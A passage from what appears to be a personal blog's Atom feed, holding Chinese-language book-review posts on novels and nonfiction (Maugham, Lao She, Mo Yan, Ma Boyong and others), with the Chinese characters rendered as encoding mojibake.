äº†ä¸€èµ·éœ‡æƒŠå…¨ä¿„çš„å‡¶æ€æ¡ˆï¼Œæœ€ç»ˆåœ¨åŸºç£å¾’ç´¢å°¼é›…å§‘å¨˜çš„è§„åŠä¸‹ï¼ŒæŠ•æ¡ˆè‡ªé¦–ï¼Œè¢«åˆ¤æµæ”¾è¥¿ä¼¯åˆ©äºšã€‚ä½œå“ç€é‡åˆ»ç”»ä¸»äººå…¬çŠ¯ç½ªå‰åçš„å¿ƒé‡Œå˜åŒ–ï¼Œæ­ç¤ºä¿„å›½ä¸‹å±‚äººæ°‘çš„è‰°éš¾ç”Ÿæ´»ã€‚</p><p>è¿™æœ¬ä¹¦å¯¹äºäººç‰©çš„å¿ƒç†æå†™å†™çš„æ˜¯çœŸçš„å¥½ï¼Œå°±æ˜¯äººç‰©åå­—ä¸€ä¸ªä¸ªéƒ½æŒºé•¿çš„ï¼Œæœ‰æ—¶å€™è®°ä¸ä½ã€‚</p><h4 id="é¢çº±"><a href="#é¢çº±" class="headerlink" title="é¢çº±"></a>é¢çº±</h4><p><img src="/2023/05/09/è¯»ä¹¦åˆ†äº«IV/6.jpg" alt="6" style="zoom:30%;"></p><p><strong>åªæœ‰ä¸€ç§åŠæ³•èƒ½èµ¢å¾—ä¼—äººçš„å¿ƒï¼Œé‚£å°±æ˜¯è®©äººä»¬è®¤ä¸ºä½ æ˜¯åº”è¯¥è¢«çˆ±çš„</strong></p><p>å®¹è²Œå¨‡ç¾è€Œåˆçˆ±æ…•è™šè£çš„è‹±å›½å¥³å­å‡¯è’‚ï¼Œä¸ºäº†é¿å…è‡ªå·±å˜æˆä¸€ä½è€å§‘å¨˜ï¼Œæ¥å—äº†ç”Ÿæ€§å­¤åƒ»çš„åŒ»ç”Ÿç“¦å°”ç‰¹Â·è´¹æ©çš„æ±‚å©šã€‚å¥¹ç¦»å¼€äº†ä¸Šä¸–çºª20å¹´ä»£ä¼¦æ•¦æµ®åè€Œç©ºè™šçš„ç¤¾äº¤åœˆï¼Œéšç“¦å°”ç‰¹è¿œèµ´ç¥ç§˜çš„ä¸œæ–¹æ®–æ°‘åœ°â€”â€”é¦™æ¸¯ã€‚å¯¹å©šå§»æ„Ÿåˆ°ä¸æ»¡å’Œæ— è¶£ï¼Œå‡¯è’‚å¼€å§‹æ‚„æ‚„ä¸ä»¤å¥¹èŠ³å¿ƒæ‘‡åŠ¨çš„é¦™æ¸¯åŠ©ç†å¸ƒæ”¿å¸æŸ¥ç†Â·å”ç”Ÿå·æƒ…ã€‚é¢å¯¹ä¸å¿ çš„å¦»å­ï¼Œç“¦å°”ç‰¹å†³å®šä¸¾å®¶å‰å¾€éœä¹±æ¨ªè¡Œçš„ä¸­å›½å†…åœ°è¡ŒåŒ»ã€‚åœ¨é¥è¿œç¾ä¸½çš„å¼‚ä¹¡ï¼Œä»–ä»¬æ¯å¤©ä¸æ­»äº¡å’Œç»æœ›æ“¦èº«è€Œè¿‡ï¼Œç»å†äº†ä»æœªä½“éªŒè¿‡çš„æƒ…æ„Ÿæ³¢æ¾œâ€¦â€¦åœ¨çˆ±æƒ…ã€èƒŒå›ä¸æ­»äº¡çš„æ¼©æ¶¡ä¸­æŒ£æ‰çš„å‡¯è’‚ï¼Œäº²å†äº†å¹»æƒ³ç ´ç­ä¸ç”Ÿæ­»ç¦»åˆ«ä¹‹åï¼Œç»ˆå°†ç”Ÿæ´»çš„é¢çº±ä»å¥¹çš„çœ¼å‰æ¸æ¸æ­å»ï¼Œä»æ­¤è¸ä¸Šäº†ä¸æ‚”çš„ç²¾ç¥æˆé•¿ä¹‹è·¯ã€‚</p><p>æ¯›å§†çš„æ•…äº‹ä»æ¥éƒ½å’Œçˆ±æƒ…æ— å…³ï¼Œæ‰€æœ‰åˆ’è¿‡æ—¶é—´çš„é†‰å¿ƒç»å†ï¼Œæ‰€æœ‰å¦‚å±¥è–„å†°çš„å†…å¿ƒç…ç†¬ï¼Œæœ€åéƒ½æˆä¸ºä¸€æ¡æ¢ç´¢è‡ªæˆ‘å†…å¿ƒçš„è·¯ï¼Œåˆ’å¼€ç”Ÿæ´»çš„è¡¨çš®ï¼Œè°ä¹Ÿä¸éœ€è¦æ•‘èµï¼Œå……ç›ˆçš„äººå¯ä»¥è¡€æ·‹æ·‹çš„æ­»å»ï¼Œæ·¡æ¼ çš„äººæœ€ç»ˆå­¦ä¼šçœŸæ­£çš„æ·¡æ¼ ã€‚</p><h4 id="å±±æ²³æ•…äºº"><a href="#å±±æ²³æ•…äºº" class="headerlink" title="å±±æ²³æ•…äºº"></a>å±±æ²³æ•…äºº</h4><p><img src="/2023/05/09/è¯»ä¹¦åˆ†äº«IV/7.jpg" alt="7" style="zoom:50%;"></p><p><strong>å®¶äººé—²åï¼Œç¯ç«å¯äº²</strong></p><p>æœ¬ä¹¦å®Œå¤‡åœ°æ”¶å½•äº†æ±ªæ›¾ç¥ºæ€€äººå¿†æ—§ç³»åˆ—æ•£æ–‡ã€‚åœ¨ä¹¦ä¸­ï¼Œæˆ‘ä»¬å°†è®¤è¯†ä½œè€…å„¿æ—¶çš„å®¶åº­æˆå‘˜å’Œå­¦æ ¡æ•™å‘˜ã€æ•…ä¹¡çš„è¡—å··åº—é“ºå’ŒåŠé—´å¥‡äººï¼Œè¿˜æœ‰æ˜”æ—¥è¥¿å—è”å¤§é‚£äº›æ°”è´¨å„å¼‚çš„å¸ˆç”Ÿä»¥åŠåœ¨æˆ˜ä¹±å¹´ä»£ä»æœ‰è¶£åœ°ç”Ÿæ´»ç€çš„äººä»¬ã€‚ä¹¦ä¸­ä¹Ÿæ”¶å…¥äº†ä½œè€…è°ˆæ²ˆä»æ–‡çš„å¤šç¯‡æ–‡å­—ï¼Œä»ä¸­å¯ä»¥çª¥è§20ä¸–çºªä¸­å›½ä¸¤ä½æ–‡å­¦å¤§å¸ˆä¹‹é—´æ·±æŒšåŠ¨äººçš„æƒ…è°Šâ€¦â€¦</p><p>é‚£äº›å›ä¸å»çš„æ—¶å…‰ï¼Œéƒ½æ˜¯ä¸¾ä¸–æ— åŒçš„å¥½æ—¶å…‰ã€‚æ›¾ç»åœ¨è®°å¿†é‡Œçš„é‚£äº›æ•…äººï¼Œå¸Œæœ›éƒ½èƒ½å„è‡ªå®‰å¥½ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;æ¥šæ±‰åŒé›„&quot;&gt;&lt;a href=&quot;#æ¥šæ±‰åŒé›„&quot; class=&quot;headerlink&quot; title=&quot;æ¥šæ±‰åŒé›„&quot;&gt;&lt;/a&gt;æ¥šæ±‰åŒé›„&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2023/05/09/è¯»ä¹¦åˆ†äº«IV/1.jpg&quot; alt=&quot;1&quot; style=&quot;zoom:80%;&quot;&gt;
      
    
    </summary>
    
    
      <category term="éšç¬”" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>è¯»ä¹¦åˆ†äº«III</title>
    <link href="elssm.github.io/2023/02/27/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABIII/"/>
    <id>elssm.github.io/2023/02/27/è¯»ä¹¦åˆ†äº«III/</id>
    <published>2023-02-27T13:38:32.000Z</published>
    <updated>2023-10-09T12:21:27.299Z</updated>
    
    <content type="html"><![CDATA[<h4 id="é•¿å®‰çš„è”æ"><a href="#é•¿å®‰çš„è”æ" class="headerlink" title="é•¿å®‰çš„è”æ"></a>é•¿å®‰çš„è”æ</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/1.png" alt="1" style="zoom:50%;"></p><p><strong>å°±ç®—å¤±è´¥ï¼Œæˆ‘ä¹Ÿæƒ³çŸ¥é“ï¼Œè‡ªå·±å€’åœ¨è·ç¦»ç»ˆç‚¹å¤šè¿œçš„åœ°æ–¹ã€‚</strong></p><p>å¤§å”å¤©å®åå››å¹´ï¼Œé•¿å®‰åŸçš„å°åæå–„å¾·çªç„¶æ¥åˆ°ä¸€ä¸ªä»»åŠ¡ï¼šè¦åœ¨è´µå¦ƒè¯æ—¥ä¹‹å‰ï¼Œä»å²­å—è¿æ¥æ–°é²œè”æã€‚è”æâ€œä¸€æ—¥è‰²å˜ï¼Œä¸¤æ—¥é¦™å˜ï¼Œä¸‰æ—¥å‘³å˜â€ï¼Œè€Œå²­å—è·é•¿å®‰äº”åƒä½™é‡Œï¼Œå±±æ°´è¿¢è¿¢ï¼Œè¿™æ˜¯ä¸ªä¸å¯èƒ½å®Œæˆçš„ä»»åŠ¡ï¼Œå¯ä¸ºäº†å®¶äººï¼Œæå–„å¾·å†³å¿ƒæ”¾æ‰‹ä¸€æï¼šâ€œå°±ç®—å¤±è´¥ï¼Œæˆ‘ä¹Ÿæƒ³çŸ¥é“ï¼Œè‡ªå·±å€’åœ¨è·ç¦»ç»ˆç‚¹å¤šè¿œçš„åœ°æ–¹ã€‚â€å”æœè¯—äººæœç‰§çš„ä¸€å¥â€œä¸€éª‘çº¢å°˜å¦ƒå­ç¬‘ï¼Œæ— äººçŸ¥æ˜¯è”ææ¥â€ä¸€åƒå¤šå¹´æ¥å¼•å‘äº†äººä»¬çš„æ— é™éæƒ³ï¼Œä½†é²œè”æçš„ä¿é²œæ—¶é™ä»…æœ‰ä¸‰å¤©ï¼Œè¿™åœºè·¨è¶Šäº”åƒä½™é‡Œçš„ä¼ å¥‡è½¬è¿ä¹‹æ—…ç©¶ç«Ÿæ˜¯å¦‚ä½•è¾¾æˆçš„ï¼Œè°è®©æ¨è´µå¦ƒåœ¨é•¿å®‰åƒåˆ°äº†æ¥è‡ªå²­å—çš„é²œè”æï¼Ÿä½œè€…é©¬ä¼¯åº¸å°±æ­¤å±•å¼€äº†ä¸€åœºè„‘æ´éå¸¸å¤§çš„æƒ³è±¡ã€‚</p><p>å››ä¸ªå°æ—¶è¯»å®Œäº†è¿™æœ¬ä¹¦ã€‚å½“é”…ç”©åˆ°ä½ èº«ä¸Šçš„æ—¶å€™ï¼Œä½ è¿˜èƒ½æ€ä¹ˆåŠå‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>ä¸Šé¢ä¸€å¥è¯ï¼Œä¸‹é¢è·‘æ–­è…¿ã€‚ä¸ºäº†è¿œåœ¨é•¿å®‰çš„è´µäººæƒ³åƒä¸€å£æ–°é²œè”æï¼Œå‡ åå¹´çš„è”ææœå›­å°½æ•°è¢«æ¯ï¼Œå†œæ°‘ä¸å ªèµ‹ç¨èƒŒäº•ç¦»ä¹¡ï¼Œéª‘æ‰‹é©¬åŒ¹ç«­åŠ›æ—¥å¤œå…¼ç¨‹è¿é€èµ¶è·¯ï¼Œæ¶‰é™©æ¸¡æ±Ÿï¼Œé©¬åŒ¹æ¨ªæ­»ã€‚è¿™å·²ç»ä¸æ˜¯ç®€å•çš„äººåŠ›ç‰©åŠ›è´¢åŠ›è¿™å‡ ä¸ªè¯å¯ä»¥æ¦‚æ‹¬çš„ï¼Œè¿™èƒŒåæ˜¯æœå†œçš„è¡€æ³ªï¼Œåº•å±‚å®˜å‘˜çš„æŒ£æ‰ã€‚è€Œæœ€ç»ˆè¿™ä¸€åœºæ¥åŠ›è·¯ç¨‹ï¼Œæµ©æµ©è¡è¡çš„å‡ºå‘é˜Ÿä¼ï¼Œèƒ½å¤Ÿèµ°åˆ°é•¿å®‰çš„ï¼Œä»…ä¸€äººï¼Œä¸€éª‘ã€‚å…¶ä½™æ­»åœ¨è·¯ä¸Šçš„ç´¯å€’åœ¨è·¯ä¸Šçš„ï¼Œæœ‰è°ï¼Œæœ‰å¤šå°‘äººï¼Œæ— äººåœ¨æ„ï¼Œåæ­£è´µäººæ˜¯å¾ˆå¼€å¿ƒçš„ã€‚ä¸€éª‘çº¢å°˜å¦ƒå­ç¬‘ï¼Œæ— äººçŸ¥æ˜¯è”ææ¥ã€‚å…¨ä¹¦ç´§é”£å¯†é¼“èŠ‚å¥ç´§å‡‘ï¼Œé˜…è¯»è¿‡ç¨‹ç•…å¿«æ·‹æ¼“ï¼Œç½®ä¹‹æ­»åœ°è€Œåç”Ÿï¼Œå¤„å¤„äº®ç‚¹å¤„å¤„æ¢—ï¼Œä»¥ä¸€ä¸ªå°äººç‰©çš„è§†è§’çª¥è§†äº†å¤§å¦å°†å€¾çš„å”æœç››ä¸–ã€‚ï¼ˆæ‘˜è‡ªè±†ç“£ï¼‰</p><h4 id="åŠ¡è™šç¬”è®°"><a href="#åŠ¡è™šç¬”è®°" class="headerlink" title="åŠ¡è™šç¬”è®°"></a>åŠ¡è™šç¬”è®°</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/2.png" alt="2" style="zoom:50%;"></p><p><strong>æœ‰åŒºåˆ«æ‰æœ‰è‡ªå·±ï¼Œè‡ªå·±å°±æ˜¯åŒºåˆ«ï¼›æœ‰è·ç¦»æ‰æœ‰è·¯ï¼Œè·¯å°±æ˜¯è·ç¦»ã€‚</strong></p><p>ã€ŠåŠ¡è™šç¬”è®°ã€‹æ˜¯è½®æ¤…ä¸Šçš„å²é“ç”Ÿçš„é¦–éƒ¨é•¿ç¯‡å°è¯´ï¼Œä¹Ÿæ˜¯ä»–åŠè‡ªä¼ å¼çš„ä½œå“ã€‚éš”ç€å’«å°ºçš„ç©ºé—´ä¸æµ©ç€šçš„æ—¶é—´ï¼Œä½œå®¶å°†å¸¦ç€è¯»è€…å‡æœ›ç”Ÿå‘½çš„å“€è‰³ä¸æ— å¸¸ï¼Œä½“å‘³å†å²çš„ä¸°é¥¶ä¸çŸ­æš‚ã€‚è¿™æ˜¯ä½œè€…çš„é•¿ç¯‡å°è¯´å¤„å¥³ä½œï¼Œè¡Œæ–‡ä¼˜ç¾ã€å‡ç»ƒï¼Œæƒ…æ„ŸçœŸæŒšã€åšé‡ï¼Œä¸”å¥½è¯»ï¼Œå¤„å¤„é€æ˜ ç€ä¸€ç§å¯¹äººä¸–æ²§æ¡‘çš„å¦‚æ³£å¦‚è¯‰ã€ä¼¼å¹½ä¼¼æ€¨çš„ä¼¤æ„Ÿä¸é¢†æ‚Ÿã€‚</p><h4 id="äººæ€§çš„æ·é”"><a href="#äººæ€§çš„æ·é”" class="headerlink" title="äººæ€§çš„æ·é”"></a>äººæ€§çš„æ·é”</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/3.png" alt="3" style="zoom:50%;"></p><p><strong>åˆæ“å¿ƒä»Šå¤©ï¼Œåˆå‘æ„æ˜å¤©ã€‚é‚£æ´»ç€è¿˜æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿå½“ä½ è¿‡ä¸ä¸‹å»çš„æ—¶å€™ï¼Œè‡ªç„¶ä¼šæœ‰å‡ºè·¯ã€‚</strong></p><p>ã€Šäººæ€§çš„æ·é”ã€‹æ˜¯æ¯›å§†å…·æœ‰è‡ªä¼ æ€§è´¨çš„ç»å…¸ä½œå“ï¼Œä¹Ÿè¢«è®¤ä¸ºæ˜¯é¦–å±ˆä¸€æŒ‡ã€æµä¼ ç”šå¹¿çš„é‡è¦ä»£è¡¨ä½œã€‚å’Œã€Šæœˆäº®å’Œå…­ä¾¿å£«ã€‹ã€Šé¢çº±ã€‹ã€Šåˆ€é”‹ã€‹ä¸€é“ï¼Œå¥ å®šæ¯›å§†â€œæ•…äº‹åœ£æ‰‹â€åŸºç¡€å’Œæ–‡å­¦å²ç‹¬ç‰¹åœ°ä½ã€‚æ•…äº‹ä»¥æ¯›å§†äº²èº«ç»å†ä¸ºè“æœ¬ï¼Œæè¿°äº†èº«æœ‰æ®‹ç–¾çš„ä¸»äººå…¬è²åˆ©æ™®ä»å­¤å„¿åˆ°é•¿å¤§çš„å®Œæ•´è¿‡ç¨‹ï¼Œäº²æƒ…ã€çˆ±æƒ…ã€å‹æƒ…ï¼Œæ ¡å›­ã€è‰ºæœ¯ã€ç†æƒ³ï¼Œåœ¨é‡é‡æ·é”ä¸­ï¼Œè‹¦å¯»è‡ªç”±è€Œéš¾å¾—ï¼Œæœ€ç»ˆå‘ç°è¿™éƒ½æ˜¯äººæ€§çš„æœ¬æ¥é¢ç›®ã€‚æ˜¯å¦èƒ½æ‘†è„±è¿™äººæ€§çš„æ·é”ï¼Ÿä»€ä¹ˆæ˜¯é•¿å¤§ï¼Œä»€ä¹ˆæ˜¯æˆç†Ÿï¼Ÿç­”æ¡ˆåœ¨é£ä¸­é£˜ï¼Œå¸¦ç€ç¬‘å’Œæ³ªã€‚</p><p>è¿™æœ¬ä¹¦ä¸­å°†äººæ€§æå†™çš„ç®€ç›´ä¸èƒ½å†çœŸå®ï¼Œ100å¤šå¹´å‰çš„è§‚ç‚¹ç°åœ¨æ¥çœ‹ä¾ç„¶ä¸è¿‡æ—¶ã€‚ä»ä¸€å¼€å§‹è¢«å„ç§å®‰æ’åˆ°æœ€åå†²ç ´æ·é”ã€‚è²åˆ©æ™®æ˜¯å¹¸è¿çš„ã€‚ä»ç‰§å¸ˆåˆ°ä¼šè®¡åˆ°ç”»å®¶å†åˆ°åŒ»ç”Ÿï¼Œè²åˆ©æ™®æ˜¯æœ‰æ‰çš„ã€‚æˆ–è®¸æ¯ä¸ªäººéƒ½èƒ½åœ¨èƒ½è²åˆ©æ™®èº«ä¸Šçœ‹åˆ°80%çš„è‡ªå·±ã€‚</p><h4 id="æ­£çº¢æ——ä¸‹"><a href="#æ­£çº¢æ——ä¸‹" class="headerlink" title="æ­£çº¢æ——ä¸‹"></a>æ­£çº¢æ——ä¸‹</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/4.png" alt="4" style="zoom:50%;"></p><p><strong>æˆ‘ä»¬åˆ›é€ äº†ä¸€ç§ç‹¬å…·é£æ ¼çš„ç”Ÿæ´»æ–¹å¼ï¼šæœ‰é’±çš„çœŸè®²ç©¶ï¼Œæ²¡é’±çš„ç©·è®²ç©¶ã€‚ ç”Ÿå‘½å°±è¿™ä¹ˆæ²‰æµ®åœ¨æœ‰è®²ç©¶çš„ä¸€æ±ªæ­»æ°´é‡Œ ä»–ä»¬çš„ä¸€ç”Ÿï¼Œåƒåšä½œç€ä¸€ä¸ªç»†å·§çš„ï¼Œæ˜ç™½è€Œåˆæœ‰ç‚¹ç³Šæ¶‚çš„æ¢¦</strong></p><p>ã€Šæ­£çº¢æ——ä¸‹ã€‹æ˜¯è€èˆæœªå®Œè‡ªä¼ ä½“é•¿ç¯‡å°è¯´é—ä½œï¼Œæ‰‹ç¨¿å…±åä¸€ç« ï¼Œä¸€ç™¾å…­åå››é¡µã€‚ä¸€ä¹å…­å…­å¹´å…«æœˆäºŒåå››æ—¥ï¼Œè€èˆè‡ªæ²‰äºåŒ—äº¬å¤ªå¹³æ¹–ï¼Œè¿™éƒ¨ä½œå“ä¸ä»–çš„äººç”Ÿï¼Œæˆ›ç„¶è€Œæ­¢ã€‚è€èˆä¸ºæ——äººï¼Œéš¶å±â€œæ»¡æ´²å…«æ——â€çš„â€œæ­£çº¢æ——â€ï¼Œè¿™ä¹Ÿæ˜¯ä¹¦åçš„ç”±æ¥ã€‚è€èˆä»â€œæˆ‘â€å‡ºç”Ÿå†™èµ·ï¼Œå½“æ—¶æ­£æ˜¯æ¸…æœæœ«å¹´ï¼Œç¤¾ä¼šåŠ¨è¡ï¼Œæ°‘ç”Ÿå‡‹æ•ã€‚çœ¼çœ‹ç€å¤§ æ¸…ç‹æœèµ°å‘æ²¡è½ï¼Œå…»å°Šå¤„ä¼˜çš„å…«æ——å­å¼Ÿä»¬ä¹Ÿåœ¨æœ«è·¯æŒ£æ‰â€¦â€¦éšç€ä¹‰å’Œå›¢å…´èµ·ï¼Œæ´‹äººåˆ°æ¥ï¼ŒåŒ—äº¬è€ç™¾å§“å¹³é™çš„ç”Ÿæ´»è¢«æ‰“ç ´ï¼Œä¸€ä¸ªä¸ªäººç‰©åœ¨è€èˆç¬”ä¸‹æ ©æ ©å¦‚ç”Ÿï¼šè€å®å·´äº¤çš„çˆ¶äº²ã€å–„è‰¯æ­£ç›´çš„ç‹æŒæŸœã€å°–é…¸åˆ»è–„çš„å§‘æ¯ã€èªæ˜èƒ½å¹²çš„ç¦æµ·äºŒå“¥ã€å¦„è‡ªå°Šå¤§çš„ç‰›ç‰§å¸ˆâ€¦â€¦è¿™äº›èº«å¤„åœ¨åŠ¨è¡å†å²æ´ªæµä¸­çš„å¤§æ¸…å­æ°‘ï¼Œéƒ½èµ°å‘äº†ä¸åŒçš„å‘½è¿â€¦â€¦</p><p>å®šå¤§çˆ·çš„é¥­å±€åˆšå¼€å§‹ï¼Œç»“å±€æˆ›ç„¶è€Œæ­¢ã€‚</p><p>1966å¹´8æœˆ24æ—¥åˆå¤œï¼Œè€èˆå…ˆç”Ÿè‡ªæ²‰å¤ªå¹³æ¹–ã€‚è¿™éƒ¨ä½œå“ä¸ä»–çš„äººç”Ÿï¼Œæˆ›ç„¶è€Œæ­¢ã€‚</p><h4 id="æˆ‘å«åˆ˜è·ƒè¿›"><a href="#æˆ‘å«åˆ˜è·ƒè¿›" class="headerlink" title="æˆ‘å«åˆ˜è·ƒè¿›"></a>æˆ‘å«åˆ˜è·ƒè¿›</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/5.png" alt="5" style="zoom:50%;"></p><p><strong>æ·±æ¸Šæœ‰åº•ï¼Œäººå¿ƒéš¾æµ‹ã€‚</strong></p><p>ã€Šæˆ‘å«åˆ˜è·ƒè¿›ã€‹ç”±åˆ˜éœ‡äº‘ç¼–è‘—ã€‚è®²è¿°äº†ï¼šåˆ˜è·ƒè¿›æ˜¯åŒ—äº¬æŸå»ºç­‘å·¥åœ°çš„æ°‘å·¥ï¼Œä¸Šè¡—æ—¶ä»–çš„åŒ…è¢«äººæŠ¢äº†ï¼Œé‡Œé¢è£…ç€ä»–å…¨éƒ¨è´¢äº§ã€‚æ‰¾åŒ…çš„è¿‡ç¨‹ä¸­ï¼Œä»–åˆæ¡åˆ°ä¸€ä¸ªåŒ…ï¼Œè¿™ä¸ªåŒ…é‡Œè—ç€å¤©å¤§çš„ç§˜å¯†ï¼Œç‰µæ¶‰åˆ°ä¸Šæµç¤¾ä¼šçš„å‡ æ¡äººå‘½ã€‚äºæ˜¯å‡ æ‹¨æ‰¾è¿™ä¸ªåŒ…çš„äººé©¬ï¼Œåˆå¼€å§‹æ‰¾åˆ˜è·ƒè¿›â€¦â€¦ åˆ˜è·ƒè¿›åƒä¸€åªæ— è¾œçš„ç¾Šï¼Œæ„å¤–åœ°é—¯å…¥äº†ç‹¼ç¾¤ï¼Œä»–è‡ªè®¤å€’éœ‰å´ä¸æ‚²è§‚ã€‚é—®é¢˜åœ¨äºï¼Œä¸–ç•Œä¸Šæ‰€æœ‰çš„ç‹¼ï¼Œéƒ½æŠ«ç€ç¾Šçš®ï¼Œå’Œè”¼å¯äº²ï¼›è€Œä¸–ç•Œä¸Šæ‰€æœ‰çš„ç¾Šåˆåœ¨è£…å¤§å°¾å·´ç‹¼ï¼Œè£…è…”ä½œåŠ¿ã€‚</p><p>è¿™æœ¬ä¹¦çœŸæ˜¯çœ‹äº†å°±åœä¸ä¸‹æ¥ã€‚ã€‚ã€‚ç¯ç¯ç›¸æ‰£ï¼Œä¸€æ°”å‘µæˆã€‚ä¸¤ä¸ªåŒ…ã€ä¸€ä¸ªæ¬ æ¡ã€ä¸€ä¸ªuç›˜ä¸²è”äº†ä¹¦ä¸­çš„æ‰€æœ‰äººç‰©ã€‚ä¹Ÿåº”äº†é‚£å¥è¯ï¼šæ˜¯éåªå› å¤šå¼€å£ï¼Œçƒ¦æ¼æ€»ä¸ºå¼ºå‡ºå¤´ã€‚</p><h4 id="ä¸°ä¹³è‚¥è‡€"><a href="#ä¸°ä¹³è‚¥è‡€" class="headerlink" title="ä¸°ä¹³è‚¥è‡€"></a>ä¸°ä¹³è‚¥è‡€</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/6.png" alt="6" style="zoom:50%;"></p><p><strong>å—ä¼¤çš„éº¦å­ï¼Œæœ‰çš„ç›´èµ·è…°ï¼Œæœ‰çš„æ°¸è¿œç›´ä¸èµ·è…°</strong></p><p>ã€Šä¸°ä¹³è‚¥è‡€ã€‹æ˜¯ä¸­å›½å½“ä»£ä½œå®¶è«è¨€åˆ›ä½œçš„é•¿ç¯‡å°è¯´ ã€‚å°è¯´çƒ­æƒ…è®´æ­Œäº†ç”Ÿå‘½æœ€åŸåˆçš„åˆ›é€ è€…â€”â€”æ¯äº²çš„ä¼Ÿå¤§ã€æœ´ç´ ä¸æ— ç§ï¼Œç”Ÿå‘½çš„æ²¿è¢­çš„æ— ä¸ä¼¦æ¯”çš„é‡è¦æ„ä¹‰ã€‚å¹¶ä¸”åœ¨è¿™ä¸€å¹…ç”Ÿå‘½çš„æµç¨‹å›¾ä¸­ï¼Œå¼¥æ¼«ç€å†å²ä¸æˆ˜äº‰çš„ç¡çƒŸï¼ŒçœŸå®ï¼Œä¸å¸¦ä»»ä½•åè§ï¼Œå†ç°äº†ä¸€æ®µæ—¶æœŸå†…çš„å†å²ã€‚</p><p>ä¸€éƒ¨å®¶æ—çš„è‹¦éš¾å²ï¼Œä¸€éƒ¨æ°‘æ—çš„è‹¦éš¾å²ï¼Œä¸€ä¸ªæ‡¦å¼±ç”·äººçš„æˆé•¿å²ï¼</p><h4 id="ç»“æ„æ€§æ”¹é©"><a href="#ç»“æ„æ€§æ”¹é©" class="headerlink" title="ç»“æ„æ€§æ”¹é©"></a>ç»“æ„æ€§æ”¹é©</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/7.jpeg" alt="7" style="zoom:50%;"></p><p>æ°é€¢ç™¾å¹´æœªæœ‰ä¹‹å¤§å˜å±€ï¼Œç»æµè½¬å‹å‘å±•ã€ä¸­ç¾è´¸æ˜“æ‘©æ“¦ã€æ–°å† ç–«æƒ…æš´å‘ç­‰é—®é¢˜äº¤ç›¸å åŠ ï¼Œæ— ä¸è€ƒéªŒç€æˆ‘å›½é¢å¯¹å¤æ‚é—®é¢˜çš„æ™ºæ…§å’Œå‹‡æ°”ï¼Œä¾›ç»™ä¾§ç»“æ„æ€§æ”¹é©çš„é‡è¦æ€§ä¸ç´§è¿«æ€§ç©ºå‰å‡¸æ˜¾ã€‚è¿™æœ¬ä¹¦ä»åŸºç¡€æ€§ã€ç»“æ„æ€§ã€æœºåˆ¶æ€§ã€åˆ¶åº¦æ€§ç­‰å¤šä¸ªç»´åº¦ï¼Œæ·±å…¥å‰–ææˆ‘å›½ä¾›ç»™ä¾§å…³é”®çŸ›ç›¾å¹¶å¯¹ç—‡ä¸‹è¯ã€‚å…¨ä¹¦ä¸€å…±ä¸ƒç« ã€‚ç¬¬ä¸€ç« è¯¦è§£å¦‚ä½•ç´§æŠ“ä¾›ç»™ä¾§ç»“æ„æ€§æ”¹é©ä¸»çº¿ï¼›ç¬¬äºŒç« èšç„¦å»æ æ†ä¸é‡‘èé£é™©é˜²èŒƒï¼›ç¬¬ä¸‰ç« è§£è¯»æ–°æ—¶ä»£ä¸‹æˆ‘å›½èµ„æœ¬å¸‚åœºé«˜è´¨é‡å‘å±•ä¹‹è·¯ï¼›ç¬¬å››ç« è®²è¿°â€œæ•°å­—åŒ–â€å¦‚ä½•é‡å¡‘ç»æµç¤¾ä¼šç”Ÿæ€ï¼›ç¬¬äº”ç« å¯¹æˆ¿åœ°äº§é•¿æ•ˆè°ƒæ§æœºåˆ¶å¼€å‡ºè¯æ–¹ï¼Œå¹¶é¢„åˆ¤ä»Šååå¹´æˆ¿åœ°äº§è¡Œä¸šå…­å¤§è¶‹åŠ¿ï¼›ç¬¬å…­ç« ç€çœ¼äºå›½æœ‰ä¼ä¸šèµ„æœ¬è¿ä½œä¸åœ°æ–¹æ”¿åºœè¥å•†ç¯å¢ƒæ”¹å–„ï¼›ç¬¬ä¸ƒç« é˜é‡Šæ–°å±€é¢ã€æ–°ç‰¹å¾ä¸‹ï¼Œæˆ‘å›½å¯¹å›½é™…å½¢åŠ¿ä¸ä¸­ç¾å…³ç³»çš„åº”å¯¹ä¹‹é“ï¼Œæ·±å…¥å‰–æâ€œåŒå¾ªç¯â€æ–°æ ¼å±€ã€‚</p><h4 id="æ²§æµªä¹‹æ°´"><a href="#æ²§æµªä¹‹æ°´" class="headerlink" title="æ²§æµªä¹‹æ°´"></a>æ²§æµªä¹‹æ°´</h4><p><img src="/2023/02/27/è¯»ä¹¦åˆ†äº«III/8.png" alt="8" style="zoom:50%;"></p><p><strong>äººç”Ÿå¹¶æ²¡æœ‰ä»€ä¹ˆæœ€å¥½çš„é€‰æ‹©ï¼Œä»»ä½•é€‰æ‹©éƒ½è¦ä»˜å‡ºä»£ä»·ã€‚å…¨éƒ¨çš„é—®é¢˜æ˜¯è‡ªå·±æ„¿æ„ä»˜å‡ºæ€æ ·çš„ä»£ä»·ã€‚</strong></p><p>ã€Šæ²§æµªä¹‹æ°´ã€‹æ˜¯ä¸­å›½å½“ä»£ä½œå®¶é˜çœŸåˆ›ä½œçš„é•¿ç¯‡å°è¯´ï¼Œé¦–æ¬¡å‘è¡¨äºã€Šå½“ä»£ã€‹2001å¹´ç¬¬4æœŸã€‚ ã€Šæ²§æµªä¹‹æ°´ã€‹åœ¨ä¸»äººå…¬æ± å¤§ä¸ºçš„å¿ƒçµè§†åŸŸä¸ç”Ÿå­˜ç©ºé—´è¿™ä¸¤ä¸ªå®¡è§†å±‚é¢ä¸Šï¼Œå±•ç¤ºäº†20ä¸–çºªæœ«ä¸­å›½çŸ¥è¯†åˆ†å­æ‰€é¢å¯¹çš„ç§ç§çŸ›ç›¾å†²çªå’Œçº 